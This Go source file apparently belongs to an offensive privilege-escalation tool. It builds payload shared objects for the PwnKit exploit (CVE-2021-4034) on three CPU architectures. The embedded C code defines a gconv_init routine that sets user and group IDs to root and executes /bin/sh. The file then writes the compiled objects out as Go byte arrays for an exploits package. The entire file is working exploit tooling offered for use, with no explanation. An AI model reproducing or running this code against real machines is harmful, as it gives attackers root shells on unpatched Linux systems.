package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
)

const outputDir = "./pkg/exploits/cve20214034"

func main() {
	if err := buildPwnkitSharedObjects(); err != nil {
		panic(err)
	}
}

func buildPwnkitSharedObjects() error {

	for _, platform := range []struct {
		goarch string
		binary string
		args   []string
	}{
		{
			goarch: "amd64",
			binary: "gcc",
			args:   []string{"-Wall", "--shared", "-fPIC", "-o"},
		},
		{
			goarch: "386",
			binary: "gcc",
			args:   []string{"-m32", "-Wall", "--shared", "-fPIC", "-o"},
		},
		{
			goarch: "arm64",
			binary: "aarch64-linux-gnu-gcc",
			args:   []string{"-Wall", "--shared", "-fPIC", "-o"},
		},
	} {

		for _, command := range []string{"/bin/sh", "/usr/bin/true"} {

			desc := filepath.Base(command)

			pwnkitSrc := fmt.Sprintf(`#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv(void) {}

void gconv_init(void *step) {
  char *const args[] = {"%s", NULL};
  char *const environ[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/"
                           "bin:/sbin:/bin:/opt/bin",
                           NULL};
  setuid(0);
  setgid(0);
  execve(args[0], args, environ);
  exit(0);
}`, command)

			sourcePath := filepath.Join(os.TempDir(), "traitor.c")
			if err := ioutil.WriteFile(sourcePath, []byte(pwnkitSrc), 0600); err != nil {
				return err
			}
			if err := exec.Command(platform.binary, append(platform.args, "/tmp/traitor.so", sourcePath)...).Run(); err != nil {
				return err
			}

			soFilename := fmt.Sprintf("sharedobject_%s_%s.go", desc, platform.goarch)
			soPath := filepath.Join(outputDir, soFilename)

			rawSO, err := ioutil.ReadFile("/tmp/traitor.so")
			if err != nil {
				return err
			}

			output := bytes.NewBufferString(
				fmt.Sprintf(
					"//go:build %s\npackage cve20214034\n\nvar pwnkit_%s_sharedobj = []byte{",
					platform.goarch,
					desc,
				),
			)

			for i, b := range rawSO {
				if i%16 == 0 {
					output.WriteString("\n ")
				}
				output.WriteString(fmt.Sprintf(" %d,", b))
			}
			output.WriteString("\n}\n")
			if err := ioutil.WriteFile(soPath, output.Bytes(), 0755); err != nil {
				return err
			}
		}
	}

	return nil

}
